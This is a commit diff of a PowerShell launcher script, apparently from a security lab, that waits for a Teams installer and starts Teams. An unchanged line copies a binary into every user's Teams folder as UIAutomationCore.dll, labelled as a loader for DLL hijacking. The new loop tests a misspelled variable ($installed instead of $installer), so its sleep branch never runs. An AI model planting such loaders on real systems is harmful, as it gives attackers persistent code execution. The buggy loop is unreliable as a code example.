e493086c13324acf806b640e49cb220efd7e0783
elusivethreat <68078458+elusivethreat@users.noreply.github.com>
2024-01-03 21:02:48 +0000

    Update Launch.ps1

--- Launch.ps1
+++ Launch.ps1
@@ -1,7 +1,19 @@
-# Init Folders
-Start-Sleep -Seconds 30
-Start-Job -ScriptBlock { Start-Process -PSPath 'C:\Program Files (x86)\Teams Installer\Teams.exe' }
-Start-Sleep -Seconds 10
+while($true) {
+
+    $installer = Test-Path "C:\Program Files (x86)\Teams Installer\Teams.exe"
+
+    if ($installed -eq $false) {
+        Write-Host "Sleeping for 10..." > C:\Users\Public\Desktop\LAB_FILES\InstallLog.txt
+        Start-Sleep 10
+
+    }
+    if($installer -eq $true) {
+        Write-Host "Choco install done! Starting Teams now!" > C:\Users\Public\Desktop\LAB_FILES\InstallLog.txt
+        Start-Job -ScriptBlock { Start-Process -PSPath 'C:\Program Files (x86)\Teams Installer\Teams.exe' }
+        break
+    }
+
+}
 
 # Transfer files into install dir
 Get-ChildItem "C:\Users" | ForEach-Object { Copy-Item "C:\Users\Public\Desktop\LAB_FILES\MS_Plugin\FirstHook\LunarUI.bin" $_"\AppData\Local\Microsoft\Teams\UIAutomationCore.dll" } # Loader
